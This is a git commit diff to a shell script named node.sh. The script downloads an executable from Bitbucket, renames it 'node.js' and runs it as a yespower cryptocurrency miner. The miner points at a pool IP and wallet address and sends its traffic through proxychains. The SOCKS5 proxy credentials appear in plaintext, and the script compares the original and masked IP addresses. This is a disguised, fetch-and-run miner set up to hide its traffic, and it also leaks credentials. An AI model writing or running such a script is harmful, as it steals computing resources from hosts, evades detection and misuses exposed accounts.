804a8a3b7ab595121f68bb04fa7487a7d705570a
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-10 19:07:37 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,8 +1,8 @@
 proxy="us-east-static-06.quotaguard.com" 
 port="9293" 
-user="stn3ggvkldsddw"  
-pass="p3r35flqfwbmajhygybulo10517x1" 
-wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
+user="oer0zxkf45i21d"  
+pass="9sby02q1lcum4g2x74lsur1a00nus" 
+wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./kva -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-100 -n 1)-uut) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://stn3ggvkldsddw:p3r35flqfwbmajhygybulo10517x1@us-east-static-06.quotaguard.com:1080 
+./panel ./node.js -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-100 -n 1)-uut) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://oer0zxkf45i21d:9sby02q1lcum4g2x74lsur1a00nus@us-east-static-06.quotaguard.com:1080 
